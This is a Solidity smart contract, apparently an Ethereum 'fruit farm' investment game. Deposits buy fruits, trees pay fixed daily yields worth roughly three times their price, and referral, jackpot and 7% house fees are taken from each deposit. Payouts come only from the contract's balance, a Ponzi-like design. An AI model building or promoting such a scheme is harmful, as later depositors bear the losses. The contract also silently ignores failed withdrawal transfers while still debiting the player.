pragma solidity ^0.4.23;

contract FruitFarm {

    using SafeMath for uint;

    uint32 constant FRUIT_PRICE = 100000;
    uint32 constant TREE_TYPES = 5;
    uint constant REMINDER = 1e6;
    uint constant PERIOD = 1 days;
    uint constant VALIDITY = 60 days;
    uint constant MAX_PROPERTY_LIMIT = 5;
    uint constant MIN_JACKPOT_ENTRY = 1000e6;
    uint constant MAX_JACKPOT_ROUND_TIMER = 24 hours;
    uint constant TIME_INCREMENT_VALUE = 30 seconds;
    address public HOUSE_ADDRESS = 0xb7CD6539197aC502F883eBc07536470D7b9a5b0E;


    uint[TREE_TYPES] treePrices = [1000e6, 10000e6, 50000e6, 250000e6, 500000e6];
    uint[TREE_TYPES] productionRate = [50e6, 500e6, 2500e6, 12500e6,  25000e6];

    uint public JACKPOT_ROUND_TRACKER;

    address owner_;



    struct States{
        uint totalPlayers;
        uint totalTrees;
        uint totalCashOut;
    }

    struct JackpotRound{
        uint startTime;
        uint endTime;
        uint currentPot;
        address currentLeader;
        uint totalRuntime;
    }

    struct Player {
        uint regTime;
        uint frozenFruits;
        uint consumableFruits;
        address referrer;
        uint earningFromReferral;
    }

    struct Property{
        uint purchasedOn;
        uint expireDate;
        uint lastCollectionDate;
        uint fruitProduced;
    }


    States public bankStates;
    mapping(uint=>JackpotRound) public jackpotRounds;
    mapping(address => Player) public players;
    mapping(address => mapping(uint32=>mapping(uint32=>Property))) public properties;


    event FruitPurchased(address indexed from, uint256 value);
    event TreePlanted(address indexed from, uint256 fruitSpent, uint256 unitType,uint32 propertyNo);
    event Withdrawal(address indexed from, uint256 value);
    event FruitCollected(address indexed player, uint256 collectedFruits);
    event PaymentSuccess(address indexed beneficiary, uint amount,string sendfor);
    event FailedPayment(address indexed beneficiary, uint amount,string sendfor);

    constructor() public {
        owner_ = msg.sender;
    }


    // View methods
    function BankVault() public view returns(uint256) {
        return address(this).balance;
    }

    function getFruitsOfType(address _playeraddr,uint32 _treeType) public view returns (uint256 collectablefruits) {

        uint dayPassed;
        uint fruits;
        uint newCollectionDate;

        for(uint32 j=0;j<MAX_PROPERTY_LIMIT;j++){
            (fruits,newCollectionDate,dayPassed) = collecFruitsFrom(_playeraddr,_treeType,j);
            if(dayPassed>0 && fruits>0){
                collectablefruits = collectablefruits.add(fruits);
            }

        }
    }


    function getFruitsFromTree(address _playeraddr,uint32 _treeType,uint32 _propertyNo) public view returns(uint collectablefruits,uint newCollectionDate,uint dayPassed){
        (collectablefruits,newCollectionDate,dayPassed) = collecFruitsFrom(_playeraddr,_treeType,_propertyNo);
    }


    // external methods
    function deposit() external payable{
        processDeposit(address(0));
    }

    function depositReferred(address referrer) external payable{
        require(msg.sender!=referrer,"Sorry can't refer yourself");
        processDeposit(referrer);
    }

    function plantTree(uint32 _treeType, uint32 _propertyNo ) external {

        require( _treeType < TREE_TYPES , "Tree not found");
        require(_propertyNo<MAX_PROPERTY_LIMIT,"Invalid property No");

        Property storage propertyObj = properties[msg.sender][_treeType][_propertyNo];

        require(propertyObj.expireDate<now,"Can't plant a tree on this property right now");



        uint treePrice = treePrices[_treeType];

        Player storage player = players[msg.sender];


        //check if this property tree has any unclaimed fruits
        if(propertyObj.expireDate>0){

            uint dayPassed;
            uint collectedFruits;
            uint newCollectionDate;

            (collectedFruits,newCollectionDate,dayPassed) = collecFruitsFrom(msg.sender,_treeType,_propertyNo);

            if(collectedFruits>0 && dayPassed>0){
                player.frozenFruits = player.frozenFruits.add(collectedFruits.div(2));
                player.consumableFruits = player.consumableFruits.add(collectedFruits.div(2));
            }
        }


        require(treePrice <= player.frozenFruits.add(player.consumableFruits),  "You don't have enough fruits to plant this tree");

        if (treePrice <= player.frozenFruits) {
            player.frozenFruits = player.frozenFruits.sub(treePrice);
        } else {
            player.consumableFruits = player.consumableFruits.add(player.frozenFruits).sub(treePrice);
            player.frozenFruits = 0;
        }


        if(propertyObj.purchasedOn==0){
            bankStates.totalTrees = bankStates.totalTrees.add(1);
        }

        propertyObj.purchasedOn = now;
        propertyObj.expireDate = propertyObj.purchasedOn.add(VALIDITY);
        propertyObj.lastCollectionDate = propertyObj.purchasedOn;
        propertyObj.fruitProduced = 0;

        emit TreePlanted(msg.sender,  treePrice, _treeType,_propertyNo);
    }



    function collectFruits(address _playeraddr) external {

        Player storage player = players[_playeraddr];

        uint totalcollectedFruits;
        uint dayPassed;
        uint fruits;
        uint newCollectionDate;

        for (uint32 i = 0; i < TREE_TYPES; i++) {

            for(uint32 j=0;j<MAX_PROPERTY_LIMIT;j++){

                (fruits,newCollectionDate,dayPassed) = collecFruitsFrom(_playeraddr,i,j);

                if(dayPassed>0 && fruits>0){
                    Property storage property = properties[_playeraddr][i][j];
                    property.lastCollectionDate = newCollectionDate;
                    totalcollectedFruits = totalcollectedFruits.add(fruits);
                    property.fruitProduced = property.fruitProduced.add(fruits);
                }

            }
        }

        if(totalcollectedFruits>0){
            player.frozenFruits = player.frozenFruits.add(totalcollectedFruits.div(2));
            player.consumableFruits = player.consumableFruits.add(totalcollectedFruits.div(2));
        }

        emit FruitCollected(_playeraddr,totalcollectedFruits);
    }



    function withdraw(uint256 _fruits) external {

        uint wFruits = _fruits.mul(REMINDER);

        require(wFruits > 0 && wFruits <= players[msg.sender].consumableFruits , "You don't have this much fruits to withdraw");

        Player storage player = players[msg.sender];

        player.consumableFruits = player.consumableFruits.sub(wFruits);
        _exchange(msg.sender, wFruits.mul(FRUIT_PRICE).div(REMINDER));
    }




    // Internal and private  methods


    function processDeposit(address referrer)  private {

        require(msg.value >= FRUIT_PRICE,"Not enough amount to buy fruits");

        uint depositAmount = msg.value;
        uint convertedFruits = msg.value.div(FRUIT_PRICE).mul(REMINDER);


        Player storage player = players[msg.sender];
        player.frozenFruits = player.frozenFruits.add(convertedFruits);

        if (player.regTime==0) {
            player.regTime = now;
            bankStates.totalPlayers++;
        }

        if(player.referrer==address(0) && referrer!=address(0)){
            player.referrer = referrer;
        }

        uint refShare = calculatePercent(depositAmount,3);
        uint devShare = calculatePercent(depositAmount,7);
        uint jackpotShare = calculatePercent(depositAmount,2);


        if (player.referrer!=address(0) ) {
            players[player.referrer].earningFromReferral =  players[player.referrer].earningFromReferral.add(refShare);
            sendFunds(player.referrer,refShare,"refReward");
        } else {
            devShare = devShare.add(refShare);
        }


        JackpotRound storage currentRound = jackpotRounds[JACKPOT_ROUND_TRACKER];


        if(currentRound.endTime>=now){
            currentRound.currentPot = currentRound.currentPot.add(jackpotShare);
            if(convertedFruits>=MIN_JACKPOT_ENTRY){
                incrementRoundTimer(convertedFruits.div(MIN_JACKPOT_ENTRY));
                currentRound.currentLeader = msg.sender;
            }
        }else{

            //start a new round
            JACKPOT_ROUND_TRACKER++;

            JackpotRound storage newRound = jackpotRounds[JACKPOT_ROUND_TRACKER];
            newRound.startTime = now;
            newRound.endTime = newRound.startTime.add(MAX_JACKPOT_ROUND_TIMER);
            newRound.currentPot = jackpotShare;


            if(convertedFruits>=MIN_JACKPOT_ENTRY){
                incrementRoundTimer(convertedFruits.div(MIN_JACKPOT_ENTRY));
                newRound.currentLeader = msg.sender;
            }


            //send funds to the winner if has
            if(currentRound.currentLeader!=address(0)){
                sendFunds(currentRound.currentLeader,currentRound.currentPot,"jackpot-winner");
            }else{
                newRound.currentPot = newRound.currentPot.add(currentRound.currentPot);
            }
        }

        sendFunds(HOUSE_ADDRESS,devShare,"devFee");


        emit FruitPurchased(msg.sender, msg.value);
    }




    function collecFruitsFrom(address _playeraddr,uint32 _treeType,uint32 _propertyNo) private view returns(uint collectablefruits,uint newCollectionDate,uint dayPassed){

        Property memory property = properties[_playeraddr][_treeType][_propertyNo];

        if(property.purchasedOn>0){
            uint daily_production_rate = productionRate[_treeType];
            uint currentTime = now;

            if(currentTime<=property.expireDate){
                dayPassed = (currentTime.sub(property.lastCollectionDate)).div(PERIOD);
            }else{
                dayPassed = (property.expireDate.sub(property.lastCollectionDate)).div(PERIOD);
            }

            if(dayPassed>0){
                collectablefruits = dayPassed.mul(daily_production_rate);
                newCollectionDate = property.lastCollectionDate.add(dayPassed.mul(PERIOD));
            }
        }

    }


    function _exchange(address _withdrawer, uint _amount) internal {
        if (_amount > 0 && _withdrawer != address(0)) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                bankStates.totalCashOut = bankStates.totalCashOut.add(payout);
                sendFunds(_withdrawer,payout,"withdraw");
            }
        }
    }


    function incrementRoundTimer(uint timecounter) private{

        JackpotRound storage currentJackpotRound = jackpotRounds[JACKPOT_ROUND_TRACKER];

        uint timeGap = currentJackpotRound.endTime-now;
        if(timeGap<MAX_JACKPOT_ROUND_TIMER){
            uint will_increment_time = TIME_INCREMENT_VALUE.mul(timecounter);
            if((timeGap.add(will_increment_time))>MAX_JACKPOT_ROUND_TIMER){
                currentJackpotRound.endTime =currentJackpotRound.endTime.add(MAX_JACKPOT_ROUND_TIMER.sub(timeGap));
            }else{
                currentJackpotRound.endTime =currentJackpotRound.endTime.add(will_increment_time);
            }
            currentJackpotRound.totalRuntime = currentJackpotRound.totalRuntime.add(will_increment_time);
        }
    }


    function calculatePercent(uint256 base,uint256 share) private pure returns(uint256 result){
        result = base.mul(share).div(100);
    }


    function sendFunds(address reciever, uint amount,string sendFor) private {
        if (reciever.send(amount)) {
            emit PaymentSuccess(reciever, amount,sendFor);
        } else {
            emit FailedPayment(reciever, amount,sendFor);
        }
    }


}




library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}